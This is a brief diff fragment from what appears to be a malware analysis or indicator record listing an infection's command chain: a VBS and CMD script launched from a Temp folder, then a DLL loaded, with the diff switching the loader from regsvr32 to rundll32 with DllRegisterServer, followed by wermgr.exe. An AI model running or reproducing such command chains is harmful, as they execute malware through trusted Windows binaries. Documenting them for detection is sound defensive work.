@@ -21,7 +21,7 @@ WScript.exe C:\Users\Admin\AppData\Local\Temp\publish\perfunctorinessRehash.vbs
 
 cmd /c C:\Users\Admin\AppData\Local\Temp\publish\irritationTemperateness.cmd
 
-regsvr32 /s C:\Users\Admin\AppData\Local\Temp\publish\pebbles.dll
+rundll32 C:\Users\Admin\AppData\Local\Temp\publish\pebbles.dll,DllRegisterServer
 
 wermgr.exe
 
